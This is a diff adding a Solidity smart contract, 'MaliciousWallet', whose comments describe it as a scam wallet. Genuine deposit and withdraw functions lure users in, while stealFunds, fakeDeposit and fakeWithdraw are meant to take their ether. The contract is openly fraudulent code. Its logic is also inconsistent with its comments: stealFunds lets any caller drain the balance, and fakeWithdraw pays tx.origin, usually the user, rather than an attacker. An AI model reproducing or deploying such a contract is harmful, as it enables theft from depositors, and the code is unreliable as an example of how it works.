@@ -1,0 +1,36 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract MaliciousWallet {
+    mapping(address => uint256) public balances;
+
+    // This function allows the attacker to steal funds
+    function stealFunds() public {
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    // This function mimics a deposit function but does not update the balance
+    function fakeDeposit() public payable {
+        // Intentionally left empty to mimic deposit without updating balance
+    }
+
+    // This function mimics a withdrawal function but sends funds to the attacker
+    function fakeWithdraw(uint256 amount) public {
+        require(balances[msg.sender] >= amount, "Insufficient balance");
+        balances[msg.sender] -= amount;
+        // Send funds to the attacker instead of the user
+        payable(tx.origin).transfer(amount);
+    }
+
+    // A real deposit function to lure users into depositing funds
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    // A real withdrawal function to maintain the illusion of legitimacy
+    function withdraw(uint256 amount) public {
+        require(balances[msg.sender] >= amount, "Insufficient balance");
+        balances[msg.sender] -= amount;
+        payable(msg.sender).transfer(amount);
+    }
+}
